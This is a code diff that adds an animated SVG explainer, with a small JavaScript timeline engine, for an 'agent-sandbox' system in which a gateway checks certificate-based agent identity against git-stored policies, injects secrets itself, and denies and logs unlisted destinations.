+    <rect x="1340" y="200" width="420" height="130" class="card" stroke="#C3E88D"/>
+    <text x="1370" y="246" class="h" style="font-size:26px">frontend-dev <tspan class="mono num">/ 6</tspan></text>
+    <text x="1370" y="284" class="t2" style="font-size:24px">vite listens on 0.0.0.0:3000</text>
+    <text x="1370" y="314" class="t3" style="font-size:22px">preview: shop-alice.preview…</text>
+    <path d="M1340 265 C 1220 265, 1180 500, 1110 520" class="wire"/>
+  </g>
+  <g id="browser" data-a>
+    <rect x="1340" y="345" width="420" height="60" rx="8" fill="#16181D" stroke="#2A2E37" stroke-width="2" stroke-dasharray="6 4"/>
+    <text x="1370" y="383" class="t3" style="font-size:22px">browser ← gateway ← pod :3000</text>
+  </g>
+  <g id="f5" data-a>
+    <rect x="1340" y="470" width="420" height="130" class="card" stroke="#C3E88D"/>
+    <text x="1370" y="516" class="h" style="font-size:26px">netops <tspan class="mono num">/ 4</tspan></text>
+    <text x="1370" y="554" class="t2" style="font-size:24px">NetBox audit finished</text>
+    <g id="f5s"><text x="1370" y="584" class="t3" style="font-size:22px">idle for 1 hour …</text></g>
+    <line x1="1340" y1="535" x2="1110" y2="535" class="wire"/>
+  </g>
+  <g id="f5x" data-a>
+    <text x="1370" y="584" class="cst" style="font-size:22px">asleep · number 4 retired</text>
+  </g>
+  <g id="f6" data-a>
+    <rect x="1340" y="740" width="420" height="130" class="card" stroke="#C3E88D"/>
+    <text x="1370" y="786" class="h" style="font-size:26px">backend-dev <tspan class="mono num">/ 10</tspan></text>
+    <text x="1370" y="824" class="t2" style="font-size:24px">new pod, new certificate</text>
+    <text x="1370" y="854" class="t3" style="font-size:22px">numbers never repeat</text>
+    <path d="M1340 805 C 1220 805, 1180 570, 1110 550" class="wire"/>
+  </g>
+</g>
+
+<!-- ===================== END CARD ===================== -->
+<g id="end">
+  <g id="e0" data-a><text x="960" y="430" text-anchor="middle" class="h" style="font-size:64px">agent-sandbox</text></g>
+  <g id="e1" data-a><text x="960" y="530" text-anchor="middle" class="t2" style="font-size:36px">Identity in the certificate.</text></g>
+  <g id="e2" data-a><text x="960" y="590" text-anchor="middle" class="t2" style="font-size:36px">Rules in git.</text></g>
+  <g id="e3" data-a><text x="960" y="650" text-anchor="middle" class="t2" style="font-size:36px">One exit, for every agent.</text></g>
+  <g id="e4" data-a><text x="960" y="740" text-anchor="middle" class="mono t3" style="font-size:24px">github.com/k1dory/cluster-agent</text></g>
+</g>
+
+<!-- ===================== CAPTIONS ===================== -->
+<g id="caps">
+  <line x1="100" y1="925" x2="1820" y2="925" stroke="#1E2127" stroke-width="2"/>
+  <g id="c1" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">1</tspan>  A task arrives through the API.</text><text x="100" y="1030" class="sub">That is the only way in. No SSH, no shell, no UI inside the sandbox.</text></g>
+  <g id="c2" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">2</tspan>  sandboxd starts a pod with one network interface.</text><text x="100" y="1030" class="sub">It leads to the gateway and nowhere else. The pod gets a certificate: who it is, not what it may do.</text></g>
+  <g id="c3" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">3</tspan>  The agent calls an MCP server.</text><text x="100" y="1030" class="sub">The gateway reads the certificate, finds the slug's policy, matches host and path. Allowed.</text></g>
+  <g id="c4" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">3</tspan>  The agent pushes to Git.</text><text x="100" y="1030" class="sub">Allowed, and the gateway adds the token itself. The agent never holds a secret.</text></g>
+  <g id="c5" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">3</tspan>  The agent tries somewhere else.</text><text x="100" y="1030" class="sub">No rule, no route. Everything is logged with the agent's identity.</text></g>
+  <g id="c6" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">4</tspan>  Zoom out: many pods, one gateway, one policy repository.</text><text x="100" y="1030" class="sub">Each pod carries its own number and answers to the same rules.</text></g>
+  <g id="c7" data-a><text x="100" y="985" class="cap"><tspan class="fn mono">4</tspan>  An hour without the user: the pod is deleted, its disk stays.</text><text x="100" y="1030" class="sub">The next task wakes a new pod with the next number. Old certificates stay dead.</text></g>
+</g>
 </svg>
+
+<script>
+// ---------- tiny deterministic timeline engine ----------
+const tracks = [];
+const $ = id => document.getElementById(id);
+const ease = t => 1 - Math.pow(1 - t, 3);
+const lerp = (a, b, t) => a + (b - a) * t;
+function add(id, at, dur, props) { tracks.push({ el: $(id), at: at * 1000, dur: dur * 1000, props }); }
+const show = (id, at, dur = .5) => add(id, at, dur, { opacity: [0, 1], scale: [.96, 1] });
+const hide = (id, at, dur = .5) => add(id, at, dur, { opacity: [1, 0] });
+function along(id, pathId, at, dur, from = 0, to = 1) { tracks.push({ el: $(id), path: $(pathId), at: at * 1000, dur: dur * 1000, from, to }); }
+function type(id, text, at, dur) { tracks.push({ el: $(id), text, at: at * 1000, dur: dur * 1000 }); }
+function light(id, at, dur = .4) { tracks.push({ el: $(id).querySelector('rect'), at: at * 1000, dur: dur * 1000, props: { opacity: [0, .18] } }); }
+function unlight(id, at, dur = .4) { tracks.push({ el: $(id).querySelector('rect'), at: at * 1000, dur: dur * 1000, props: { opacity: [.18, 0] } }); }
+function dim(id, at, dur, to) { add(id, at, dur, { opacity: [1, to] }); }
+
+// ---- chapter 1: the task arrives (0–6.5) ----
+show('c1', 0.2); show('client', 0.6);
+type('req1', 'POST /v1/sandboxes/sb_1/runs', 1.2, 1.0);
+type('req2', '{"task": "add tests for checkout"}', 2.3, 1.4);
+show('sbd', 3.2); show('w1', 3.4, .3);
+along('pk1', 'pathClientSbd', 3.9, .7); add('pk1', 3.9, .1, { opacity: [0, 1] }); add('pk1', 4.6, .2, { opacity: [1, 0] });
+show('sbd1', 4.7, .4); show('sbd2', 5.1, .4); show('sbd3', 5.5, .4);
+
+// ---- chapter 2: pod + identity (6.5–13) ----
+hide('c1', 6.3, .3); show('c2', 6.7);
+show('gw', 7.0); show('w2', 7.2, .3);
+along('pk2', 'pathSbdGw', 7.5, .6); add('pk2', 7.5, .1, { opacity: [0, 1] }); add('pk2', 8.1, .2, { opacity: [1, 0] });
+show('pod', 8.2); show('w3', 8.8, .6);
+show('identTxt', 10.2, .5); show('think', 11.0, .4);
+
+// ---- chapter 3a: MCP allowed (13–20) ----
+hide('c2', 12.8, .3); show('c3', 13.2);
+show('policy', 13.4); show('mcp', 13.8); show('git', 13.8); show('w4', 14.0, .3); show('w5', 14.0, .3);
+show('rq1', 14.4, .3);
+add('pk3', 14.8, .1, { opacity: [0, 1] }); along('pk3', 'pathToGw', 14.8, 1.2);
+light('pl4', 16.0); light('pl5', 16.0); hide('v0', 16.0, .2); show('vOk1', 16.2, .3); show('ok1', 16.4, .3);
+along('pk3', 'pathGwMcp', 17.0, .7); add('pk3', 17.7, .2, { opacity: [1, 0] });
+hide('rq1', 19.0, .3); unlight('pl4', 19.0); unlight('pl5', 19.0); hide('vOk1', 19.2, .3);
+
+// ---- chapter 3b: Git allowed + secret injected (20–27) ----
+hide('c3', 19.6, .3); show('c4', 20.0);
+show('rq2', 20.3, .3);
+add('pk4', 20.7, .1, { opacity: [0, 1] }); along('pk4', 'pathToGw', 20.7, 1.2);
+light('pl1', 21.9); light('pl2', 21.9); light('pl3', 22.3); show('vOk2', 22.1, .3); show('ok2', 22.5, .3);
+along('pk4', 'pathGwGit', 23.6, .7); add('pk4', 24.3, .2, { opacity: [1, 0] });
+hide('rq2', 25.8, .3); unlight('pl1', 25.8); unlight('pl2', 25.8); unlight('pl3', 25.8); hide('vOk2', 26.0, .3);
+
+// ---- chapter 3c: denied (27–35) ----
+hide('c4', 26.6, .3); show('c5', 27.0);
+show('rq3', 27.3, .3);
+add('pk5', 27.7, .1, { opacity: [0, 1] }); along('pk5', 'pathToGw', 27.7, 1.2);
+show('bad', 28.9, .3); add('pk5', 28.9, .2, { opacity: [1, 0] });
+show('vBad', 29.0, .3); show('nomatch', 29.2, .4);
+dim('pl1', 29.1, .4, .35); dim('pl2', 29.1, .4, .35); dim('pl3', 29.1, .4, .35); dim('pl4', 29.1, .4, .35); dim('pl5', 29.1, .4, .35);
+show('deny', 29.9); show('log', 31.2, .6);
+
+// ---- transition to the fleet (35–36.5) ----
+hide('c5', 34.6, .3);
+add('stageA', 35.0, 1.2, { opacity: [1, 0], scale: [1, .7] });
+
+// ---- chapter 4: the fleet (36–48.5) ----
+show('c6', 36.2);
+show('fgw', 36.4); show('fext', 36.9);
+show('f1', 37.5); show('f2', 38.3); show('f3', 39.1); show('tracker', 39.6);
+show('f4', 40.4); show('browser', 40.9); show('f5', 41.7); show('f6', 45.6);
+hide('c6', 42.6, .3); show('c7', 43.0);
+add('f5', 43.6, .8, { opacity: [1, .45], scale: [1, .97] }); add('f5s', 43.6, .4, { opacity: [1, 0] }); show('f5x', 43.8, .5);
+
+// ---- end card (48.5–54) ----
+add('stageB', 48.4, .8, { opacity: [1, 0] }); add('caps', 48.4, .8, { opacity: [1, 0] });
+show('e0', 49.2, .7); show('e1', 50.0, .6); show('e2', 50.6, .6); show('e3', 51.2, .6); show('e4', 52.2, .6);
+
+tracks.sort((a, b) => a.at - b.at);
+const state = new Map();
+function seek(ms) {
+  // defaults
+  for (const el of document.querySelectorAll('[data-a]')) { el.style.opacity = 0; el.style.transform = ''; }
+  for (const id of ['stageA', 'stageB', 'caps']) { $(id).style.opacity = 1; $(id).style.transform = ''; }
+  for (const r of document.querySelectorAll('#policy g > rect')) r.style.opacity = 0;
+  for (const g of ['pl1','pl2','pl3','pl4','pl5','v0','f5s']) $(g).style.opacity = 1;
+  const pos = new Map();
+  for (const tr of tracks) {
+    if (ms < tr.at) continue;
+    const t = tr.dur > 0 ? Math.min(1, (ms - tr.at) / tr.dur) : 1;
+    const k = ease(t);
+    if (tr.text !== undefined) { tr.el.textContent = tr.text.slice(0, Math.round(tr.text.length * t)); continue; }
+    if (tr.path) {
+      const L = tr.path.getTotalLength();
+      const p = tr.path.getPointAtLength(L * lerp(tr.from, tr.to, k));
+      pos.set(tr.el, p);
+      continue;
+    }
+    const cur = state.get(tr.el) || {};
+    for (const [prop, [a, b]] of Object.entries(tr.props)) cur[prop] = lerp(a, b, k);
+    state.set(tr.el, cur);
+  }
+  for (const [el, cur] of state) {
+    if (cur.opacity !== undefined) el.style.opacity = cur.opacity;
+    const p = pos.get(el);
+    const tx = p ? p.x : 0, ty = p ? p.y : 0;
+    const s = cur.scale !== undefined ? cur.scale : 1;
+    if (p || s !== 1) el.style.transform = `translate(${tx}px, ${ty}px) scale(${s})`;
+  }
+  for (const [el, p] of pos) if (!state.has(el)) el.style.transform = `translate(${p.x}px, ${p.y}px)`;
+  state.clear();
+  // text tracks before their start must be empty
+  for (const tr of tracks) if (tr.text !== undefined && ms < tr.at) tr.el.textContent = '';
+}
+window.seek = seek;
+window.DURATION_MS = 54000;
+// live preview in a browser tab
+if (!navigator.webdriver) { const t0 = performance.now(); (function loop(){ seek((performance.now() - t0) % window.DURATION_MS); requestAnimationFrame(loop); })(); }
+</script>
